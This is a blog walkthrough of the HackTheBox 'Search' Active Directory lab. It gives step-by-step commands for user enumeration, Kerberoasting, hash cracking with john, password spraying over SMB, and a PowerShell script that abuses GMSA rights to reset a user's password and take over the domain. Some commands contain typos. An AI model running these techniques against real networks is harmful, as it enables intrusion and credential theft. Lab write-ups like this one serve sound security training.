---
title: Search @ HackTheBox - Complete Walkthrough
date: 2025-04-25 13:00:00 
last_modified_at: 2025-04-25 13:00:00
categories: [HTB Machines,Windows Machines]
tags: [active directory,domain controller,responder,ntlm,SPN,DCSync,hack the box,GMSA,adc,kerberoasting,penetration testing,cybersecurity,walkthrough]     # TAG names should always be lowercase
comments: true
image:
  path: /./media/post4/Search.png
  alt: "Search Machine - HackTheBox Windows Active Directory Challenge"
author: Ahmed BAHYA
excerpt: "Complete walkthrough of the Search machine on HackTheBox. Learn Active Directory enumeration, Kerberoasting, password reuse, and privilege escalation techniques in this Windows domain controller challenge."
description: "Step-by-step walkthrough of the Search machine on HackTheBox. Master Active Directory enumeration, Kerberoasting attacks, password reuse exploitation, and privilege escalation techniques in this comprehensive cybersecurity challenge guide."
keywords: [hackthebox, search machine, active directory, domain controller, kerberoasting, password reuse, penetration testing, cybersecurity, walkthrough, windows, enumeration, privilege escalation, gmsa, spn]
canonical_url: https://b2hu.me/posts/Search-HTB-Walkthrough
---

## Table of Contents
- [Enumeration](#enumeration)
- [Gaining a foothold](#gaining-a-foothold)
- [PrivEsc](#privesc)

---
Hello, this my walkthroght version about the Search Box in @HTB
## Enumeration
### nmap
```shell
sudo nmap -sC -sV -p$ports -oN tcp_scan $IP
```
couple of ports indicated the target is a domain controller hosting the domain (search.htb)
```shell
echo '10.1O.10.129 search.htb' | suod tee -a /etc/hosts
```
the DC also hosts an IIS web server port 443 so we'll start by that.
### IIS Server
looking at the IIS server that hosts the company search.htb website, we coul find some sensitive information disclosure in one of the hosted images :
![screen_1](/./media/post4/inf_disc.png)
- the account Hope Sharp has a password of: **IsolationIsKey?**

the server also has some interesting endpoint that were found using gobuster :
```shell
gobuster dir -u http://search.htb/ -w /usr/share/SecLists-master/Discovery/Web-Content/Web-Servers/IIS.txt

/certenroll/          (Status: 403) [Size: 1233]
/certsrv/             (Status: 401) [Size: 1293]
/certsrv/mscep/mscep.dll (Status: 401) [Size: 1293]
/certsrv/mscep_admin  (Status: 401) [Size: 1293]
/images/              (Status: 403) [Size: 1233]
```
but access to this endpoint (ex: /staff) was denied and requested some sort of authentication :
![screen_2](/./media/post4/staff.png)
## Gaining a foothold 
after this i have created a list of possible usernames using a python script :
![screen_3](/./media/post4/pss_names.png)
then we can test those usernames if they are valid or not using **kerberute** tool :
```shell
sudo /opt/kerbrute/dist/kerbrute_linux_amd64 userenum --dc 10.10.11.129 -d search.htb ./possible_usernames.txto
```
we can siee that username **hope.sharp** was valid, so for now the we have got the credentials of the username **hope.sharp : IsoloationIsKey?**

Let's try to dump the LDAP database using ldapdomaindump. Remember, any user in Active Directory Domain Services (ADDS) can enumerate and dump domain objects, regardless of their privilege level.
```shell
ldapdomaindump -u search.htb\\hope.sharp -p IsolationIsKey 10.10.11.129
```
looking at the domain users we found an interesting service account :
![screen_4](/./media/post4/web_svc.png)
so lets try some kerberoasting, we first use our hope.sharp creds to find the required SPN, for this we’ll use impacket **GetUserSPNs** script.
```shell
impacket-GetUserSPNs search.htb/hope.sharp:IsolationIsKey? -dc-ip 10.10.11.129 -request
<SNIP>
[-] CCache file is not found. Skipping...
$krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*$117889ac179117edc...
<SNIP>
```
and after we got the **TGS** we’ll crack it using john :
```shell
john --wordlist=/usr/share/wordlists/rockyou.txt tgs.txt 
```
so now we have the password of this service account **web_svc : @3ONEmillionbaby**

after mutiple failed attempts of trying some attack vectors i opted for the password reuse since the web_svc was created by the helpdesk group users
```shell
grep "HelpDesk User" domain_users.grep | awk -F'\t' '{print $3}'
Isabela.Estrada
Keith.Hester
Chanel.Bell
Edgar.Jacobs
Lane.Wu
```
this command gave us all the possible accounts the password reuse may work on, because they are all in the HelpDesk group, so lets try a for loop seeing which account might this work 
```shell
for u in Isabela.Estrada Keith.Hester Chanel.Bell Edgar.Jacobs Lane.Wu; do smbmap -u $u -p @3ONEmillionbaby -d search -H 10.10.11.129 --no-banner --no-color 
```
looks like our user **Edgar.Jacobs** a fan of repeating his password in many accounts ( trust me i do that all the time), throught the SMB Enumeration we can see a folder that could be useful : **RedirectedFolders$** 
```shell
smbclient //search.htb/RedirectedFolders$ -U "Edgar.Jacobs"
```
while searching inside the share, i found the user.txt flag inside sierra.frye account, but not enough permessions to get the file :
```shell
smb: \> ls sierra.frye\
  .                                  Dc        0  Wed Nov 17 20:01:46 2021
  ..                                 Dc        0  Wed Nov 17 20:01:46 2021
  Desktop                           DRc        0  Wed Nov 17 20:08:00 2021
  Documents                         DRc        0  Fri Jul 31 10:42:19 2020
  Downloads                         DRc        0  Fri Jul 31 10:45:36 2020
  user.txt                           Ac       33  Wed Nov 17 19:55:27 2021

                3246079 blocks of size 4096. 767375 blocks available
smb: \> get sierra.frye\user.txt 
NT_STATUS_ACCESS_DENIED opening remote file \sierra.frye\user.txt
```
still looking for something useful i found this interesting file in edgar.jacobs desktop folder :
```shell
mb: \edgar.jacobs\Desktop\> ls
  .                                 DRc        0  Mon Aug 10 06:02:16 2020
  ..                                DRc        0  Mon Aug 10 06:02:16 2020
  $RECYCLE.BIN                     DHSc        0  Thu Apr  9 16:05:29 2020
  desktop.ini                      AHSc      282  Mon Aug 10 06:02:16 2020
  Microsoft Edge.lnk                 Ac     1450  Thu Apr  9 16:05:03 2020
  Phishing_Attempt.xlsx              Ac    23130  Mon Aug 10 06:35:44 2020

                3246079 blocks of size 4096. 767371 blocks available
smb: \edgar.jacobs\Desktop\> get Phishing_Attempt.xlsx 
getting file \edgar.jacobs\Desktop\Phishing_Attempt.xlsx of size 23130 as Phishing_Attempt.xlsx (95.3 KiloBytes/sec) (average 95.3 KiloBytes/sec)
```
i opened the file with libreoffice, and it seemed that the **c** column is password protected, but using the name box and typing C9 i could see sierra.frye password : 
![screen_5](/./media/post4/password.png)
now lets connect to the RedirectedFolders$ share as sierra.frye and get the user.txt.
## PrivEsc
while looking inside sierra.frye folder i noticed some certificate’s backup inside **/Downloads/Backups**
```shell
smb: \sierra.frye\Downloads\Backups\> ls
  .                                 DHc        0  Mon Aug 10 16:39:17 2020
  ..                                DHc        0  Mon Aug 10 16:39:17 2020
  search-RESEARCH-CA.p12             Ac     2643  Fri Jul 31 11:04:11 2020
  staff.pfx                          Ac     4326  Mon Aug 10 16:39:17 2020

                3246079 blocks of size 4096. 767785 blocks available
```
nice, now we upload this cert to firefox certifications and access https://search.htb/staff, but before that the certificate is password-protected so we need some crack, i mean to crack the password :
```shell
python3 `which pfx2john ` staff.pfx  > staff.hash

john --wordlist=/usr/share/wordlists/rockyou.txt staff.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 AVX 4x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:02:39 16.24% (ETA: 13:18:04) 0g/s 16031p/s 16031c/s 16031C/s yusay13..yurirey
0g 0:00:03:38 23.41% (ETA: 13:17:16) 0g/s 16279p/s 16279c/s 16279C/s starr-1..starmagic7681
misspissy        (staff.pfx)     
1g 0:00:05:26 DONE (2025-04-24 13:07) 0.003065g/s 16815p/s 16815c/s 16815C/s missprin1956..missnono
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
the password is **misspissy**
looking at the /staff :
![screen_6](/./media/post4/staff_2.png)
enter sierra.frye creds, after that we’ll get a webshell to the research computer.

now we can start enumerating the domain using sierra.frye user account, and by exploiting sharphound ingestor we could fin this relationship from bloodhound by choosing **Shortest Paths from Owned Principals** :
![screen_7](/./media/post4/bh_1.png)
and the user tristan.davies has a DCSync right over the domain :
![screen_8](/./media/post4/bh_2.png)

sierra.frye is a member of the **ITSEC group**, which has **ReadGMSAPassword** rights on the **BIR-ADFS-GMSA$** group managed service account. This account, in turn, has **GenericAll** rights on tristan.davies ,which has DCSync rights on the domain.

use this code below to retrieve the GMSA Password and use it to force password change of tristian.davies :
```shell
$gmsa = Get-ADServiceAccount -Identity bir-adfs-gmsa -Properties 'msds-managedpassword'
$mp = $gmsa.'msds-managedpassword'
$mp1 = ConvertFrom-ADManagedPasswordBlob $mp
$user = 'BIR-ADFS-GMSA$'
$passwd = $mp1.'CurrentPassword'
$secpass = ConvertTo-SecureString $passwd -AsPlainText -Force
$cred = new-object system.management.automation.PSCredential $user,$secpass
Invoke-Command -computername 127.0.0.1 -ScriptBlock {Set-ADAccountPassword -Identity
tristan.davies -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'Password123'
-force)} -Credential $cred
```
we then connect to tristian.davies using his new creds :

```shell
wmiexec.py 'search/tristan.davies:Password123@10.10.11.129'
```
after this you can easily get the root flag.